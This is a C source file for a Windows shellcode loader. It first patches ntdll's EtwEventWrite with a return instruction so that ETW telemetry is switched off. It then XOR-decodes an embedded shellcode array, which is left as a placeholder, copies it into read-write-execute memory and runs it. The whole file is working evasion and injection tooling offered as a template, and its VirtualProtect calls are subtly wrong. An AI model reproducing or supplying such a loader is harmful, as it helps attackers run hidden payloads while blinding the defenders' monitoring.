// SelfInjector.c
#include <windows.h>

// A function that performs a XOR operation on a BYTE array of size sz with a static key of 0xf7.
BYTE* XOR(BYTE* buf, size_t sz)
{
	char key = 0xf7;

	for (int i = 0; i < (int)sz; i++)
		buf[i] = buf[i] ^ key;
	
	return buf;
}


// A function that patches "ntdll.dll!EtwEventWrite" to prevent ETW event reporting.
void PatchETW()
{
	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

	char etwPatch[] = { 0xC3 };

	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;

	VirtualProtect((LPVOID)&etwAddr_bk, (SIZE_T)&memPage, 0x04, &lpflOldProtect);
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)NULL);
	VirtualProtect((LPVOID)&etwAddr_bk, (SIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
}

void Inject()
{
	unsigned char shellcode[] = { 
		/* Insert a XOR'ed version of your shellcode here, in a byte array format. */
		0x0
	};

	XOR(shellcode, sizeof(shellcode));

	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof(shellcode));
	((void(*)())exec)();
}

int main(int argc, char* argv)
{
    PatchETW();
    Inject();

    while(TRUE){}
}